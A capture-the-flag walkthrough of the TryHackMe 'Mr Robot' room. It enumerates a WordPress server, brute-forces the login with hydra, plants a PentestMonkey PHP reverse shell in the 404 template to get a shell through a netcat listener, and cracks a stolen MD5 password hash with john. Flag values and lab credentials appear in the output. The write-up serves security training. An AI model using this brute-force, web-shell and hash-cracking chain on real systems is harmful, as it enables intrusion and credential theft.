https://tryhackme.com/room/mrrobot

**Basic enumeration**

    22/tcp  closed ssh
    80/tcp  open   http     Apache httpd
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Apache
    443/tcp open   ssl/http Apache httpd
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=www.example.com
    | Not valid before: 2015-09-16T10:45:03
    |_Not valid after:  2025-09-13T10:45:03
    |_http-server-header: Apache

So it looks like we are working with a standard webserver so we should start to more enumerations

    gobuster dir -u http://10.10.237.76/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x txt,php

    nikto -h 10.10.237.76  
    
We find a robots.txt file so we should investigate that:

    User-agent: *
    fsocity.dic
    key-1-of-3.txt
    
    └─# cat key-1-of-3.txt 
    073403c8a58a1f80d943455fb30724b9

Lets also grab that .dic file

    wget http://10.10.237.76/fsocity.dic   

That is a big file! let us take a look at some of the entries

        └─# head fsocity.dic                                                                          
    true
    false
    wikia
    from
    the
    now
    Wikia
    extensions
    scss
    window
    
    └─# wc -l fsocity.dic 
    858160 fsocity.dic
    
    └─# sort -u fsocity.dic > sorted.dic

    └─# wc -l sorted.dic
    11451 sorted.dic

Whew that is much more reasonable to workwith, My bet is that this is a password/username list

**Initial Foothold**
    
Naviagate to the following url based on the gobuster scan
        http://10.10.237.76/wp-login
        
Pulling up burpsuite lets capture the request for a log in and feed that to hydra for some online brute forcing

        POST /wp-login.php HTTP/1.1

        Host: 10.10.237.76

        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

        Accept-Language: en-US,en;q=0.5

        Accept-Encoding: gzip, deflate

        Content-Type: application/x-www-form-urlencoded

        Content-Length: 103

        Origin: http://10.10.237.76

        Connection: close

        Referer: http://10.10.237.76/wp-login

        Cookie: s_cc=true; s_fid=30B417277AC07EA9-1832D8BCFA333922; s_nr=1661289741763; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check

        Upgrade-Insecure-Requests: 1



        log=user&pwd=passpass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.237.76%2Fwp-admin%2F&testcookie=1

         
Alright we have a post form here, so we can now shape our hydra command

        hydra -L sorted.dic -p notarealpassword 10.10.237.76 http-post-form "/wp-login.php:log=user&pwd=passpass&wp-submit=Log&testcookie=1:Invalid"

-L is the list we will use for the username

-p is the single password to be used

http-post-form = the type of attack to perform

 "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log&testcookie=1:Invalid" = Path of webiste, POST body information, fail conditions (txt)

Here we find a user name 'elliot' we can run hydra again with pretty much the same parameters and arguments, except this time we will change the -L to -l to indicate a single username to try and change -p to -P and define the same sorted list we used before

        hydra -l elliot -P sorted.dic 10.10.175.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log&testcookie=1:incorrect"

        [80][http-post-form] host: 10.10.175.151   login: elliot   password: ER28-0652

Now that we have both a username and password let us login and figure out what we are dealing with

We are working with wordpress verison 4.1.31 and we have access to edit the templates and themes for pages. From here we can upload the PenTestMonkey PHP script to a 404.php template page and then navigate to a nonexistant endpoint on the webserver to trigger the php script. Prior to triggering the script, we will start up our netcat listener on the port we defined in the pentestmonkey script

        nc -lnvp 1337
        
                connect to [10.9.2.110] from (UNKNOWN) [10.10.175.151] 37713
        Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
         14:25:35 up  1:16,  0 users,  load average: 0.00, 0.49, 2.53
        USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
        uid=1(daemon) gid=1(daemon) groups=1(daemon)
        sh: 0: can't access tty; job control turned off
        $ 


Once we navigate around a bit we find a user robot in the home directory with the second key that we cannot read with our current permissions, additionally there is a password.raw-md5 that we can read so lets grab that and bring it back to our attacker machine\

        daemon@linux:/home/robot$ cat password.raw-md5
        cat password.raw-md5
        robot:c3fcd3d76192e4007dfb496cca67e13b
        
 Passing that hash into john we receive the following output:

        ┌──(root💀kali)-[/home/kali/mrrobot]
        └─# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5                          1 ⨯
        Using default input encoding: UTF-8
        Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
        Warning: no OpenMP support for this hash type, consider --fork=4
        Press 'q' or Ctrl-C to abort, almost any other key for status
        abcdefghijklmnopqrstuvwxyz (?)  

